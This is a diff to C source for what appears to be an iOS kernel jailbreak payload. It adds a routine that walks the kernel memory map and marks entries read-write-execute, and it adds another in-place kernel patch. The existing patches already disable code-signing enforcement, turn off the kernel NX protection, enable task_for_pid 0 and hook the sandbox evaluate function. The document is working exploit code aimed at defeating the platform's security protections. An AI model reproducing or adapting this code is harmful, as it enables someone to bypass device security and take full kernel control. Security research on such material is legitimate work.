@@ -17,7 +17,7 @@
 #include <sys/sysctl.h>
 #include <net/if.h>
 
-#define DEBUG
+//#define DEBUG
 
 #ifndef DEBUG
 // strings are big and not very sneaky.
@@ -25,7 +25,7 @@
 #define assert(x) do { if(!(x)) abort(); } while(0)
 #endif
 
-#if 0
+#if 1
 #undef assert
 #define assert(x) do { if(!(x)) failz(__LINE__); } while(0)
 
@@ -93,36 +93,66 @@ static void pwn(unsigned int addr) {
 extern void patch_start();
 extern void patch_end();
 
-static void (*flush_dcache)(void *addr, unsigned size, bool phys);
-static void (*invalidate_icache)(void *addr, unsigned size, bool phys);
-static void (*copyin)(void *uaddr, void *kaddr, size_t len);
-static void (*IOLog)(char *fmt, ...);
-static void *(*kalloc)(unsigned int size);
-__attribute__((constructor))
-static void init_funcptrs() {
-    flush_dcache = (void *) CONFIG_FLUSH_DCACHE;
-    invalidate_icache = (void *) CONFIG_INVALIDATE_ICACHE;
-    copyin = (void *) CONFIG_COPYIN;
-    IOLog = (void *) CONFIG_IOLOG;
-    kalloc = (void *) CONFIG_KALLOC;
-}
+#define flush_dcache ((void (*)(void *addr, unsigned size, bool phys)) CONFIG_FLUSH_DCACHE)
+#define invalidate_icache ((void (*)(void *addr, unsigned size, bool phys)) CONFIG_INVALIDATE_ICACHE)
+#define copyin ((void (*)(void *uaddr, void *kaddr, size_t len)) CONFIG_COPYIN)
+#define IOLog ((void (*)(char *fmt, ...)) CONFIG_IOLOG)
+#define kalloc ((void *(*)(unsigned int)) CONFIG_KALLOC)
+#define lck_rw_lock_exclusive ((void (*)(void *)) CONFIG_LCK_RW_LOCK_EXCLUSIVE)
+#define lck_rw_done ((void (*)(void *)) CONFIG_LCK_RW_DONE)
+
+// yuck
+#define vm_map_to_entry(map)    ((struct vm_map_entry *) ((char *)(map) + 12))
+
+struct vm_map_entry;
+struct vm_map_links {
+    struct vm_map_entry *prev;      /* previous entry */
+    struct vm_map_entry *next;      /* next entry */
+    uint32_t     start;      /* start address */
+    uint32_t     end;        /* end address */
+};
+typedef struct vm_map_entry {
+    struct vm_map_links links;
+#define vme_prev        links.prev                                               
+#define vme_next        links.next                                               
+#define vme_start       links.start                                              
+#define vme_end         links.end                                                
+    void *object;//union vm_map_object object;
+    uint64_t  offset;
+    unsigned int is_shared:1, is_sub_map:1, in_transition:1, needs_wakeup:1, behavior:2, needs_copy:1, protection:3, max_protection:3, inheritance:2, use_pmap:1, alias:8,        no_cache:1, permanent:1, superpage_size:3, zero_wired_pages:1, pad:2;
+    unsigned short      wired_count;
+    unsigned short      user_wired_count;
+} *vm_map_entry_t;
 
 static inline void flush(void *addr, unsigned size) {
     flush_dcache(addr, size, false);
     invalidate_icache(addr, size, false);
 }
 
+__attribute__((always_inline))
+static inline void memory_hax() {
+    void *k = *((void **) CONFIG_KERNEL_MAP);
+    lck_rw_lock_exclusive(k);
+    vm_map_entry_t cur, orig, last;
+    cur = orig = vm_map_to_entry(k);
+    last = orig->vme_prev;
+    int count = 0;
+    while(cur != last && count++ < 1000) {
+        if(cur->max_protection == 0) {
+            cur->max_protection = cur->protection = 7; // RWX
+        }
+        cur = cur->vme_next;
+    }
+    lck_rw_done(k);
+}
+
 extern int ok_go(void *p, void *uap, unsigned int *retval) {
-#ifdef DEBUG
     IOLog("Whoa, I'm here!...\n");
-#endif
-    /**((unsigned int *) (CONFIG_MAC_POLICY_LIST + 8) = 1;
-    *((unsigned int *) (CONFIG_MAC_POLICY_LIST + 12) = 2;
-    *((unsigned int *) 0xdeadbeef) = 0xdeadf00d;*/
 #   define P(patch) do { *((volatile unsigned int *) CONFIG_##patch) = CONFIG_##patch##_TO; flush_dcache((void *) CONFIG_##patch, 4, false); flush((void *) CONFIG_##patch, 4); } while(0)
 
     P(PATCH1);
     P(PATCH3);
+    P(PATCH4);
     P(PATCH_CS_ENFORCEMENT_DISABLE);
     P(PATCH_KERNEL_PMAP_NX_ENABLED);
     P(PATCH_TFP0);
@@ -139,6 +169,8 @@ extern int ok_go(void *p, void *uap, unsigned int *retval) {
     *((unsigned int *) (CONFIG_SB_EVALUATE + 4)) = (unsigned int)scratch | 1;
     flush((void *) CONFIG_SB_EVALUATE, 8);
     
+    memory_hax();
+
     return 0;
 
 }
